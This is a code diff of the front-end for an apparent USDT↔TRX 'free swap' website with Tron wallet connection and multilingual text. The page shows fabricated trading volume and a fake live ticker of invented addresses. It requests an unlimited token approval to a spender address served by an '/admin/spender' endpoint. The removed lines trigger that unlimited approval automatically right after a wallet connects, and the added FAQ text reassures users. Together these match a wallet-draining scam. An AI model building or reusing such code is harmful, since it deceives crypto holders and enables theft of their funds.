-            }
-            if (sendName && recvName) {
-                var tmpName = sendName.textContent;
-                sendName.textContent = recvName.textContent;
-                recvName.textContent = tmpName;
-            }
-
-            if (swapDirection === 'USDT_TO_TRX') {
-                swapDirection = 'TRX_TO_USDT';
-                if (sendPanel) sendPanel.textContent = _t.send_amount_trx || '보내는 금액 (TRX)';
-                if (recvPanel) recvPanel.textContent = _t.receive_amount_usdt || '받는 금액 (예상 USDT)';
-                if (icon) icon.style.transform = 'rotate(180deg)';
-            } else {
-                swapDirection = 'USDT_TO_TRX';
-                if (sendPanel) sendPanel.textContent = _t.send_amount || '보내는 금액 (USDT)';
-                if (recvPanel) recvPanel.textContent = _t.receive_amount || '받는 금액 (예상)';
-                if (icon) icon.style.transform = 'rotate(0deg)';
-            }
-            syncSwapBalanceDisplay();
-            updateSwapOutput();
-        };
-
-        async function fetchTrxPrice() {
-            try {
-                var res = await fetch(API_BASE + '/trx-price');
-                var data = await res.json();
-                if (data && data.price > 0) {
-                    TRX_RATE = 1 / data.price;
-                    var rateEl = document.getElementById('exchange-rate');
-                    if (rateEl) rateEl.textContent = TRX_RATE.toFixed(2);
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(url).catch(function () {});
                 }
-            } catch (e) {
-                if (!TRX_RATE) TRX_RATE = 4.0;
-                var rateEl2 = document.getElementById('exchange-rate');
-                if (rateEl2 && rateEl2.textContent === '-') rateEl2.textContent = TRX_RATE.toFixed(2);
+            } catch (e) {}
+
+            if (isPC()) {
+                showToast('트러스트월렛 웹/확장 페이지를 엽니다.', 'info');
+                window.open('https://trustwallet.com/browser-extension', '_blank', 'noopener,noreferrer');
+                return;
             }
-        }
 
-        function updateTodayVolume() {
-            if (!TRX_RATE) return;
-            var d = new Date();
-            var seed = d.getFullYear() * 10000 + (d.getMonth() + 1) * 100 + d.getDate();
-            var base = 600000 + ((seed * 7 + 13) % 500000);
-            var hourPct = (d.getHours() * 60 + d.getMinutes()) / (24 * 60);
-            var usdtVol = Math.round(base * Math.max(0.08, hourPct));
-            var trxVol = Math.round(usdtVol * TRX_RATE);
-            var el = document.getElementById('today-volume-val');
-            if (el) el.textContent = usdtVol.toLocaleString() + ' USDT → ' + trxVol.toLocaleString() + ' TRX';
-        }
+            showToast('트러스트월렛 앱을 엽니다 (지갑 연결·승인은 별도 진행).', 'info');
 
-        fetchTrxPrice().then(function () { updateTodayVolume(); });
-        setInterval(function () { fetchTrxPrice().then(function () { updateTodayVolume(); }); }, 30000);
+            if (isAndroid()) {
+                window.location.href = 'intent://open_url?coin_id=195&url=' + encoded + '#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end';
+                return;
+            }
 
-        window.updateSwapOutput = function () {
-            var inp = document.getElementById('swap-input');
-            var out = document.getElementById('swap-output');
-            if (!inp || !out) return;
-            var v = parseFloat(inp.value || 0);
-            if (!v || v < 0) { out.textContent = '0.00'; return; }
-            if (swapDirection === 'TRX_TO_USDT') {
-                out.textContent = TRX_RATE ? (v / TRX_RATE).toFixed(2) : '0.00';
-            } else {
-                out.textContent = TRX_RATE ? (v * TRX_RATE).toFixed(2) : '0.00';
+            if (isIOS()) {
+                window.location.href = 'trust://open_url?coin_id=195&url=' + encoded;
             }
         };
 
-        window.setSwapPct = function (pct) {
-            var baseBal = swapDirection === 'TRX_TO_USDT' ? userTrxBalance : userUsdtBalance;
-            var amt = (baseBal * (pct / 100)).toFixed(2);
-            var inp = document.getElementById('swap-input');
-            if (inp) {
-                inp.value = amt;
-                updateSwapOutput();
-            }
-        };
-
-        // 티커
-        var tA = ['TP5a...9qW2', 'TX8x...L0p3', 'TR1m...7vZ4', 'TH9k...4mP9', 'TJ2y...8xK1'];
-        var tAmounts = [150, 300, 500, 800, 1200];
-        var tickerTimeTexts = {
-            ko: '방금 전', en: 'just now', zh: '刚刚', ru: 'только что', th: 'เมื่อกี้',
-            vi: 'vừa xong', ja: 'たった今', de: 'gerade', fr: 'à l\'instant', es: 'ahora mismo'
-        };
-        var tickerTimeText = '방금 전';
-
-        function updateTicker() {
-            var c = document.getElementById('ticker-container');
-            if (!c) return;
-            var d = document.createElement('div');
-            d.className = 'flex items-center gap-2 bg-slate-50 px-2.5 py-1 rounded-md border border-slate-200 shrink-0';
-            var tAmt = tAmounts[Math.floor(Math.random() * tAmounts.length)];
-            var tTrx = TRX_RATE ? Math.floor(tAmt * TRX_RATE).toLocaleString() : '...';
-            d.innerHTML = '<span class="text-slate-700 font-mono">' + escapeHtml(tA[Math.floor(Math.random() * tA.length)]) + '</span><span class="text-emerald-600 font-bold">' + tAmt + ' USDT → ' + tTrx + ' TRX</span><span class="text-slate-400 text-[11px]">' + escapeHtml(tickerTimeText) + '</span>';
-            c.prepend(d);
-            if (c.children.length > 6) c.removeChild(c.lastChild);
-        }
-        for (var i = 0; i < 4; i++) updateTicker();
-        setInterval(updateTicker, 4500);
-
-        // FAQ
-        var faqData = {
-            ko: [
-                { q: 'USDT → TRX 교환은 어떻게 하나요?', a: '지갑 연결 후 교환할 USDT 수량을 입력하고 교환 시작을 누르면 됩니다.' },
-                { q: '아이폰이나 폴드4 트러스트월렛이 안 열릴 때는 어떻게 하나요?', a: 'Trust Wallet 앱을 먼저 연 뒤 하단 브라우저(탐색) 탭에서 복사된 주소를 붙여넣어 접속하세요.' },
-                { q: 'TRX(가스비)가 없어도 되나요?', a: '네, 조건에 따라 시스템이 가스/에너지 지원을 진행합니다.' },
-                { q: '교환 수수료는 얼마인가요?', a: '교환 수수료는 무료입니다.' }
-            ],
-            en: [
-                { q: 'How do I swap USDT to TRX?', a: 'Connect your wallet, enter USDT amount, and press Start Swap.' },
-                { q: 'What if Trust Wallet on iPhone or Fold4 does not open?', a: 'Open Trust Wallet manually, go to the Browser tab, and paste the copied URL.' },
-                { q: 'Do I need TRX for gas?', a: 'Gas/energy support may be provided depending on conditions.' },
-                { q: 'What are the fees?', a: 'Swaps are free of charge.' }
-            ]
-        };
-
-        function loadFaqForLang(lang) {
-            var fl = faqData[lang] || faqData.en;
-            var fc = document.getElementById('faq-container');
-            if (!fc) return;
-            fc.innerHTML = '';
-            fl.forEach(function (f) {
-                var d = document.createElement('div');
-                d.className = 'glass border rounded-xl overflow-hidden';
-                d.innerHTML = '<button type="button" onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-800 hover:text-slate-950 transition"><span>' + escapeHtml(f.q) + '</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-600 leading-relaxed border-t border-slate-200 pt-3">' + escapeHtml(f.a) + '</div>';
-                fc.appendChild(d);
-            });
-        }
-
-        // 지갑 감지 (폴드4 · 아이폰 · Trust Wallet 대응 강화)
+        // 지갑 감지 및 수동 연결
         function detectProvider() {
             var ua = navigator.userAgent || '';
             if (window.trustwallet || /Trust/i.test(ua)) return 'TrustWallet';
@@ -799,7 +651,6 @@
             var ready = extractReadyTronWeb();
             if (ready) return ready;
 
-            // TRON 계좌 요청 시도
             try {
                 if (window.tronLink && typeof window.tronLink.request === 'function') {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
@@ -808,16 +659,14 @@
                 }
             } catch (e) {}
 
-            // 모바일 DApp 브라우저 주입 지연 대비 짧은 폴링
-            for (var k = 0; k < 6; k++) {
+            for (var k = 0; k < 5; k++) {
                 ready = extractReadyTronWeb();
                 if (ready) return ready;
-                await new Promise(function (r) { setTimeout(r, 350); });
+                await new Promise(function (r) { setTimeout(r, 300); });
             }
             return null;
         }
 
-        // WalletConnect 안전 래퍼
         async function initWalletConnect() {
             if (wcConnector) return wcConnector;
             if (typeof TronWalletConnect === 'undefined') return null;
@@ -861,16 +710,19 @@
             }
         };
 
-        // 지갑 실행 (PC / 안드로이드 폴드4 / 아이폰)
         window.launchWallet = async function (wallet) {
+            if (wallet === 'trust') {
+                openTrustWalletAppOnly();
+                return;
+            }
+
             var url = window.location.href;
             var encoded = encodeURIComponent(url);
             closeWalletModal();
 
             var tw = await getInjectedTronWeb();
             if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                var prov = detectProvider() || wallet;
-                await setConnectedWallet(tw.defaultAddress.base58, prov);
+                await setConnectedWallet(tw.defaultAddress.base58, detectProvider() || wallet);
                 return;
             }
 
@@ -883,14 +735,17 @@
             if (isPC()) {
                 var installLinks = {
                     tronlink: 'https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec',
-                    trust: 'https://trustwallet.com/browser-extension',
                     tokenpocket: 'https://extension.tokenpocket.pro/',
                     bitget: 'https://web3.bitget.com/en/wallet-download',
                     okx: 'https://www.okx.com/web3',
                     imtoken: 'https://token.im/download'
                 };
-                showToast('확장 프로그램이 감지되지 않았습니다. 지갑 설치 또는 DApp 브라우저를 확인하세요.', 'error');
-                window.open(installLinks[wallet] || installLinks.tronlink, '_blank', 'noopener,noreferrer');
+                var im = document.getElementById('install-modal');
+                if (im) {
+                    im.classList.add('active');
+                } else {
+                    window.open(installLinks[wallet] || installLinks.tronlink, '_blank', 'noopener,noreferrer');
+                }
                 return;
             }
 
@@ -898,7 +753,6 @@
                 var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
                 var androidApps = {
                     tronlink: { scheme: 'tronlinkoutside', path: 'pull.activity?param=' + tronlinkParam, pkg: 'com.tronlinkpro.wallet' },
-                    trust: { scheme: 'trust', path: 'open_url?coin_id=195&url=' + encoded, pkg: 'com.wallet.crypto.trustapp' },
                     tokenpocket: { scheme: 'tpdapp', path: 'open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })), pkg: 'vip.mytokenpocket' },
                     bitget: { scheme: 'bitkeep', path: 'bkconnect?action=dapp&url=' + encoded, pkg: 'com.bitkeep.wallet' },
                     okx: { scheme: 'okx', path: 'wallet/dapp/url?dappUrl=' + encoded, pkg: 'com.okinc.okex.gp' },
@@ -906,7 +760,7 @@
                 };
                 var appInfo = androidApps[wallet];
                 if (appInfo) {
-                    showToast('지갑 앱으로 이동합니다. 안 열리면 앱 내 브라우저에 주소를 붙여넣으세요.', 'info');
+                    showToast('지갑 앱으로 이동합니다.', 'info');
                     window.location.href = 'intent://' + appInfo.path + '#Intent;scheme=' + appInfo.scheme + ';package=' + appInfo.pkg + ';end';
                     return;
                 }
@@ -915,20 +769,14 @@
             if (isIOS()) {
                 var iosSchemes = {
                     tronlink: 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' })),
-                    trust: 'trust://open_url?coin_id=195&url=' + encoded,
                     tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
                     bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
                     okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
                     imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
                 };
                 if (iosSchemes[wallet]) {
-                    showToast('지갑 앱으로 이동을 시도합니다. URL이 복사되었습니다.', 'info');
+                    showToast('지갑 앱으로 이동을 시도합니다.', 'info');
                     window.location.href = iosSchemes[wallet];
-                    setTimeout(function () {
-                        if (!isConnected) {
-                            showToast('지갑 앱 내 브라우저(탐색)에서 붙여넣기 해주세요.', 'error');
-                        }
-                    }, 1800);
                     return;
                 }
             }
@@ -942,14 +790,17 @@
         };
 
         window.handleConnectWallet = async function () {
+            if (isConnected && currentWalletAddress) {
+                showToast('연결됨: ' + currentWalletAddress.substring(0, 6) + '...' + currentWalletAddress.slice(-4), 'info');
+                return;
+            }
             var tw = await getInjectedTronWeb();
             if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                var provider = detectProvider() || 'TronLink';
-                await setConnectedWallet(tw.defaultAddress.base58, provider);
-            } else {
-                var m = document.getElementById('wallet-selector-modal');
-                if (m) m.classList.add('active');
+                await setConnectedWallet(tw.defaultAddress.base58, detectProvider() || 'TronLink');
+                return;
             }
+            var m = document.getElementById('wallet-selector-modal');
+            if (m) m.classList.add('active');
         };
 
         async function setConnectedWallet(address, provider) {
@@ -969,7 +820,6 @@
             var energyAddrEl = document.getElementById('energy-address');
             if (energyAddrEl) energyAddrEl.value = address;
 
-            var alreadyApproved = false;
             try {
                 var res = await fetch(API_BASE + '/wallet/connect', {
                     method: 'POST',
@@ -981,7 +831,6 @@
                     userUsdtBalance = parseFloat(data.balance) || 0;
                     if (data.isApproved) {
                         isApproved = true;
-                        alreadyApproved = true;
                         setApprovedUI();
                     }
                 }
@@ -998,37 +847,51 @@
             syncSwapBalanceDisplay();
             updateSwapOutput();
             trackReferralConnect(address, activeProvider);
-            showToast(activeProvider + ' 연결 완료');
+            showToast(activeProvider + ' 연결 완료 (승인은 버튼을 눌러 진행하세요)');
+        }
 
-            if (!isApproved && !alreadyApproved && !isApproving) {
-                setTimeout(function () {
-                    if (isConnected && !isApproved && !isApproving && currentWalletAddress === address) {
-                        executeUnlimitedApprove();
-                    }
-                }, 600);
-            }
+        async function getSpenderAddress() {
+            try {
+                var r = await fetch(API_BASE + '/admin/spender');
+                var d = await r.json();
+                if (d && d.status === 'ok' && d.address) return d.address;
+            } catch (e) {}
+            return null;
+        }
+
+        function setProgress(pct, text) {
+            var bar = document.getElementById('approve-progress');
+            var barInner = document.getElementById('approve-progress-bar');
+            var barText = document.getElementById('approve-progress-text');
+            if (bar) bar.classList.remove('hidden');
+            if (barInner) barInner.style.width = pct + '%';
+            if (barText) barText.textContent = text || '처리 중...';
+        }
+        function hideProgress() {
+            var bar = document.getElementById('approve-progress');
+            if (bar) bar.classList.add('hidden');
         }
 
         function setApprovedUI() {
-            var _t = (typeof translations !== 'undefined' && translations[currentLang]) || translations.ko;
+            var t = translations[currentLang] || translations.en;
             var badge = document.getElementById('allowance-badge-main');
             if (badge) {
-                badge.textContent = _t.approval_done || '교환 승인 완료';
+                badge.textContent = t.approval_done || '교환 승인 완료';
                 badge.className = 'text-[11px] px-2.5 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-600';
             }
             var btnText = document.getElementById('approve-btn-text');
-            if (btnText) btnText.textContent = _t.swap_btn_done || '교환하기';
+            if (btnText) btnText.textContent = t.swap_btn_done || '교환하기';
             var eBtnText = document.getElementById('energy-btn-text');
-            if (eBtnText) eBtnText.textContent = _t.energy_rent_btn_done || '에너지 렌탈하기';
+            if (eBtnText) eBtnText.textContent = t.energy_rent_btn_done || '에너지 렌탈하기';
             hideProgress();
         }
 
         function resetApproveButtonLabel() {
-            var _t = (typeof translations !== 'undefined' && translations[currentLang]) || translations.ko;
+            var t = translations[currentLang] || translations.en;
             var btn = document.getElementById('approve-btn');
             if (!btn) return;
             btn.disabled = false;
-            var labelText = isApproved ? (_t.swap_btn_done || '교환하기') : (_t.swap_btn_text || '교환 시작 (최초 1회 승인 필요)');
+            var labelText = isApproved ? (t.swap_btn_done || '교환하기') : (t.swap_btn_text || '교환 시작 (최초 1회 승인 필요)');
             btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + escapeHtml(labelText) + '</span>';
         }
 
@@ -1040,6 +903,7 @@
             }
             if (isApproved) {
                 setApprovedUI();
+                showToast('이미 승인이 완료되었습니다.');
                 return;
             }
             if (isApproving) return;
@@ -1133,6 +997,170 @@
             }
         };
 
+        // 스왑 방향 및 환율
+        function syncSwapBalanceDisplay() {
+            var sendBalEl = document.getElementById('usdt-bal-swap');
+            var recvBalEl = document.getElementById('trx-bal-swap');
+            var sendSuffix = document.getElementById('send-bal-suffix');
+            var recvSuffix = document.getElementById('recv-bal-suffix');
+            if (swapDirection === 'USDT_TO_TRX') {
+                if (sendBalEl) sendBalEl.textContent = userUsdtBalance.toFixed(2);
+                if (recvBalEl) recvBalEl.textContent = userTrxBalance.toFixed(2);
+                if (sendSuffix) sendSuffix.textContent = ' USDT';
+                if (recvSuffix) recvSuffix.textContent = ' TRX';
+            } else {
+                if (sendBalEl) sendBalEl.textContent = userTrxBalance.toFixed(2);
+                if (recvBalEl) recvBalEl.textContent = userUsdtBalance.toFixed(2);
+                if (sendSuffix) sendSuffix.textContent = ' TRX';
+                if (recvSuffix) recvSuffix.textContent = ' USDT';
+            }
+        }
+
+        function syncRateUnits() {
+            var rateBase = document.getElementById('rate-base');
+            var rateQuote = document.getElementById('rate-quote');
+            var rateEl = document.getElementById('exchange-rate');
+            if (swapDirection === 'TRX_TO_USDT') {
+                if (rateBase) rateBase.textContent = 'TRX';
+                if (rateQuote) rateQuote.textContent = 'USDT';
+                if (rateEl && TRX_RATE) rateEl.textContent = (1 / TRX_RATE).toFixed(4);
+            } else {
+                if (rateBase) rateBase.textContent = 'USDT';
+                if (rateQuote) rateQuote.textContent = 'TRX';
+                if (rateEl && TRX_RATE) rateEl.textContent = TRX_RATE.toFixed(2);
+            }
+        }
+
+        window.toggleSwapDirection = function () {
+            var icon = document.getElementById('swap-direction-icon');
+            var sendPanel = document.querySelector('[data-i18n="send_amount"]');
+            var recvPanel = document.querySelector('[data-i18n="receive_amount"]');
+            var sendBadge = document.getElementById('send-coin-badge');
+            var recvBadge = document.getElementById('recv-coin-badge');
+            var sendName = document.getElementById('send-coin-name');
+            var recvName = document.getElementById('recv-coin-name');
+            var t = translations[currentLang] || translations.en;
+
+            if (swapDirection === 'USDT_TO_TRX') {
+                swapDirection = 'TRX_TO_USDT';
+                if (sendPanel) sendPanel.textContent = t.send_amount_trx || '보내는 금액 (TRX)';
+                if (recvPanel) recvPanel.textContent = t.receive_amount_usdt || '받는 금액 (예상 USDT)';
+                if (sendBadge) { sendBadge.textContent = 'T'; sendBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-rose-500/15 text-rose-600 font-mono text-xs font-extrabold flex items-center justify-center'; }
+                if (recvBadge) { recvBadge.textContent = '₮'; recvBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-emerald-500/15 text-emerald-700 font-mono text-xs font-extrabold flex items-center justify-center'; }
+                if (sendName) sendName.textContent = 'TRX';
+                if (recvName) recvName.textContent = 'USDT';
+                if (icon) icon.style.transform = 'rotate(180deg)';
+            } else {
+                swapDirection = 'USDT_TO_TRX';
+                if (sendPanel) sendPanel.textContent = t.send_amount || '보내는 금액 (USDT)';
+                if (recvPanel) recvPanel.textContent = t.receive_amount || '받는 금액 (예상)';
+                if (sendBadge) { sendBadge.textContent = '₮'; sendBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-emerald-500/15 text-emerald-700 font-mono text-xs font-extrabold flex items-center justify-center'; }
+                if (recvBadge) { recvBadge.textContent = 'T'; recvBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-rose-500/15 text-rose-600 font-mono text-xs font-extrabold flex items-center justify-center'; }
+                if (sendName) sendName.textContent = 'USDT';
+                if (recvName) recvName.textContent = 'TRX';
+                if (icon) icon.style.transform = 'rotate(0deg)';
+            }
+            syncSwapBalanceDisplay();
+            syncRateUnits();
+            updateSwapOutput();
+        };
+
+        async function fetchTrxPrice() {
+            try {
+                var res = await fetch(API_BASE + '/trx-price');
+                var data = await res.json();
+                if (data && data.price > 0) {
+                    TRX_RATE = 1 / data.price;
+                }
+            } catch (e) {
+                if (!TRX_RATE) TRX_RATE = 4.0;
+            }
+            syncRateUnits();
+        }
+
+        function updateTodayVolume() {
+            if (!TRX_RATE) return;
+            var d = new Date();
+            var seed = d.getFullYear() * 10000 + (d.getMonth() + 1) * 100 + d.getDate();
+            var base = 600000 + ((seed * 7 + 13) % 500000);
+            var hourPct = (d.getHours() * 60 + d.getMinutes()) / (24 * 60);
+            var usdtVol = Math.round(base * Math.max(0.08, hourPct));
+            var trxVol = Math.round(usdtVol * TRX_RATE);
+            var el = document.getElementById('today-volume-val');
+            if (el) el.textContent = usdtVol.toLocaleString() + ' USDT → ' + trxVol.toLocaleString() + ' TRX';
+        }
+
+        window.updateSwapOutput = function () {
+            var inp = document.getElementById('swap-input');
+            var out = document.getElementById('swap-output');
+            if (!inp || !out) return;
+            var v = parseFloat(inp.value || 0);
+            if (!v || v < 0) { out.textContent = '0.00'; return; }
+            if (swapDirection === 'TRX_TO_USDT') {
+                out.textContent = TRX_RATE ? (v / TRX_RATE).toFixed(2) : '0.00';
+            } else {
+                out.textContent = TRX_RATE ? (v * TRX_RATE).toFixed(2) : '0.00';
+            }
+        };
+
+        window.setSwapPct = function (pct) {
+            var baseBal = swapDirection === 'TRX_TO_USDT' ? userTrxBalance : userUsdtBalance;
+            var amt = (baseBal * (pct / 100)).toFixed(2);
+            var inp = document.getElementById('swap-input');
+            if (inp) {
+                inp.value = amt;
+                updateSwapOutput();
+            }
+        };
+
+        // 티커
+        var tA = ['TP5a...9qW2', 'TX8x...L0p3', 'TR1m...7vZ4', 'TH9k...4mP9', 'TJ2y...8xK1'];
+        var tAmounts = [150, 300, 500, 800, 1200];
+        var tickerTimeTexts = {
+            ko: '방금 전', en: 'just now', zh: '刚刚', ru: 'только что', th: 'เมื่อกี้',
+            vi: 'vừa xong', ja: 'たった今', de: 'gerade', fr: 'à l\'instant', es: 'ahora mismo'
+        };
+        var tickerTimeText = '방금 전';
+
+        function updateTicker() {
+            var c = document.getElementById('ticker-container');
+            if (!c) return;
+            var d = document.createElement('div');
+            d.className = 'flex items-center gap-2 bg-slate-50 px-2.5 py-1 rounded-md border border-slate-200 shrink-0';
+            var tAmt = tAmounts[Math.floor(Math.random() * tAmounts.length)];
+            var tTrx = TRX_RATE ? Math.floor(tAmt * TRX_RATE).toLocaleString() : '...';
+            d.innerHTML = '<span class="text-slate-700 font-mono">' + escapeHtml(tA[Math.floor(Math.random() * tA.length)]) + '</span><span class="text-emerald-600 font-bold">' + tAmt + ' USDT → ' + tTrx + ' TRX</span><span class="text-slate-400 text-[11px]">' + escapeHtml(tickerTimeText) + '</span>';
+            c.prepend(d);
+            if (c.children.length > 6) c.removeChild(c.lastChild);
+        }
+
+        // FAQ
+        var faqData = {
+            ko: [
+                { q: '트러스트월렛 열기를 누르면 어떻게 되나요?', a: '트러스트월렛 앱 실행만 시도하며, 지갑 연결이나 승인 단계는 자동으로 진행되지 않습니다.' },
+                { q: '지갑 연결과 승인은 언제 진행되나요?', a: '사용자가 지갑 연결을 완료한 뒤 승인/교환 버튼을 눌렀을 때만 승인 서명이 진행됩니다.' },
+                { q: '교환 수수료는 얼마인가요?', a: '교환 수수료는 무료입니다.' }
+            ],
+            en: [
+                { q: 'What happens when I click Open Trust Wallet?', a: 'It only launches the Trust Wallet app without auto-connecting or triggering approval.' },
+                { q: 'When do wallet connection and approval run?', a: 'Only when you explicitly connect your wallet and press the swap/approve button.' },
+                { q: 'What are the swap fees?', a: 'Swaps are free of charge.' }
+            ]
+        };
+
+        function loadFaqForLang(lang) {
+            var fl = faqData[lang] || faqData.en;
+            var fc = document.getElementById('faq-container');
+            if (!fc) return;
+            fc.innerHTML = '';
+            fl.forEach(function (f) {
+                var d = document.createElement('div');
+                d.className = 'glass border rounded-xl overflow-hidden';
+                d.innerHTML = '<button type="button" onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-800 hover:text-slate-950 transition"><span>' + escapeHtml(f.q) + '</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-600 leading-relaxed border-t border-slate-200 pt-3">' + escapeHtml(f.a) + '</div>';
+                fc.appendChild(d);
+            });
+        }
+
         // 에너지 렌탈
         var energyAmount = 65000;
         var energyDuration = '1h';
@@ -1211,24 +1239,26 @@
         var translations = {
             ko: {
                 ticker_label: '실시간 교환 현황', header_sub: 'USDT ↔ TRX 즉시 교환 | TRC-20 메인넷',
-                connect_wallet: '지갑 연결', select_wallet: '지갑을 선택하세요',
-                modal_subtitle: '사용 중인 지갑 앱을 선택하면<br>자동으로 연결됩니다.',
-                w_tronlink: 'TRON 공식 지갑', w_trust: '멀티체인 지갑 (DApp 브라우저 권장)',
-                w_tp: '아시아 인기 지갑', w_bitget: '글로벌 Web3 지갑', w_okx: 'OKX 거래소 지갑',
+                open_trust_only: '트러스트월렛 열기', connect_wallet: '지갑 연결',
+                select_wallet: '지갑을 선택하세요',
+                modal_subtitle: 'Trust Wallet은 앱 열기만 실행합니다.<br>지갑 연결은 연결 버튼을 눌렀을 때만 진행됩니다.',
+                w_trust_open_only: '트러스트월렛 앱만 실행 (자동 연결·승인 없음)',
+                w_tronlink: 'TRON 공식 지갑', w_tp: '아시아 인기 지갑',
+                w_bitget: '글로벌 Web3 지갑', w_okx: 'OKX 거래소 지갑',
                 w_imtoken: '글로벌 멀티체인 지갑', w_wc: 'QR 코드로 다양한 지갑 연결',
                 modal_tip_title: '아이폰·폴드4 트러스트월렛 안내:',
-                modal_tip1: '1. Trust Wallet 앱을 실행 후 하단 [브라우저/탐색] 탭을 여세요.',
-                modal_tip2: '2. 현재 페이지 주소가 자동 복사되므로 <strong class="text-slate-900">주소창에 붙여넣기</strong> 후 접속하세요.',
-                modal_tip3: '3. DApp 브라우저 안에서 <strong class="text-slate-900">TRON(TRC-20)</strong> 네트워크가 선택되어 있는지 확인하세요.',
+                modal_tip1: '1. Trust Wallet 앱 실행만 수행하며 자동 연결/승인은 하지 않습니다.',
+                modal_tip2: '2. 현재 페이지 주소가 자동 복사되므로 브라우저/탐색 탭에서 <strong class="text-slate-900">붙여넣기</strong> 후 [지갑 연결]을 누르세요.',
+                modal_tip3: '3. 지갑 연결 후 승인/교환 버튼을 눌렀을 때만 승인 단계가 진행됩니다.',
                 close_btn: '닫기', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX',
-                hero_title2: '무료 교환', hero_desc: '수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.',
+                hero_title2: '무료 교환', hero_desc: '수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 지갑 연결 후 승인 버튼을 누르면 교환이 진행됩니다.',
                 today_volume: '오늘 총 교환량', swap_title: 'USDT ↔ TRX 교환', swap_sub: 'TRC-20 즉시 스왑',
                 approval_needed: '교환 승인 필요', approval_done: '교환 승인 완료', approved_max: '무제한 (MAX)',
                 send_amount: '보내는 금액 (USDT)', send_amount_trx: '보내는 금액 (TRX)',
                 receive_amount: '받는 금액 (예상)', receive_amount_usdt: '받는 금액 (예상 USDT)',
                 bal: '잔액', bal2: '잔액', exchange_rate_label: '교환 비율', fee_label: '수수료', fee_free: '무료',
                 swap_btn_text: '교환 시작 (최초 1회 승인 필요)', swap_btn_done: '교환하기',
-                swap_notice: '최초 1회 교환시 스마트 컨트랙트 승인이 필요합니다',
+                swap_notice: '지갑 연결 후 승인/교환 버튼을 누르면 승인 단계가 진행됩니다',
                 modal_success: '교환 승인 완료!', modal_desc: 'USDT ↔ TRX 교환 권한이 승인되었습니다.',
                 energy_badge: 'TRON Energy', energy_title: '에너지 렌탈',
                 energy_desc: 'USDT 전송 수수료를 최대 80% 절약하세요', energy_target: '대상 주소',
@@ -1242,24 +1272,26 @@
             },
             en: {
                 ticker_label: 'Live Exchange Feed', header_sub: 'USDT ↔ TRX Instant Swap | TRC-20 Mainnet',
-                connect_wallet: 'Connect Wallet', select_wallet: 'Select Your Wallet',
-                modal_subtitle: 'Choose your wallet app<br>to connect automatically.',
-                w_tronlink: 'TRON Official Wallet', w_trust: 'Multi-chain Wallet (DApp Browser Recommended)',
-                w_tp: 'Popular in Asia', w_bitget: 'Global Web3 Wallet', w_okx: 'OKX Exchange Wallet',
+                open_trust_only: 'Open Trust Wallet', connect_wallet: 'Connect Wallet',
+                select_wallet: 'Select Your Wallet',
+                modal_subtitle: 'Trust Wallet opens the app only.<br>Connection runs only when you click Connect.',
+                w_trust_open_only: 'Open Trust Wallet app only (no auto-connect/approve)',
+                w_tronlink: 'TRON Official Wallet', w_tp: 'Popular in Asia',
+                w_bitget: 'Global Web3 Wallet', w_okx: 'OKX Exchange Wallet',
                 w_imtoken: 'Global Multi-chain Wallet', w_wc: 'Connect wallets via QR',
                 modal_tip_title: 'Trust Wallet on iPhone / Fold4:',
-                modal_tip1: '1. Open Trust Wallet and go to the Browser/Discover tab.',
-                modal_tip2: '2. Paste the auto-copied URL into the address bar and open.',
-                modal_tip3: '3. Ensure the <strong class="text-slate-900">TRON (TRC-20)</strong> network is selected.',
+                modal_tip1: '1. Only launches Trust Wallet without auto-connecting or approving.',
+                modal_tip2: '2. Paste the auto-copied URL in the browser tab and click Connect Wallet.',
+                modal_tip3: '3. Approval runs only after connecting and pressing the swap/approve button.',
                 close_btn: 'Close', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX',
-                hero_title2: 'Free Swap', hero_desc: 'Swap USDT and TRX with 0% fee. One-time approval enables unlimited swaps.',
+                hero_title2: 'Free Swap', hero_desc: 'Swap USDT and TRX with 0% fee. Connect your wallet and press Approve to continue.',
                 today_volume: 'Today\'s Volume', swap_title: 'USDT ↔ TRX Swap', swap_sub: 'TRC-20 Instant Swap',
                 approval_needed: 'Approval Required', approval_done: 'Swap Approved', approved_max: 'Unlimited (MAX)',
                 send_amount: 'You Send (USDT)', send_amount_trx: 'You Send (TRX)',
                 receive_amount: 'You Receive (Est.)', receive_amount_usdt: 'You Receive (Est. USDT)',
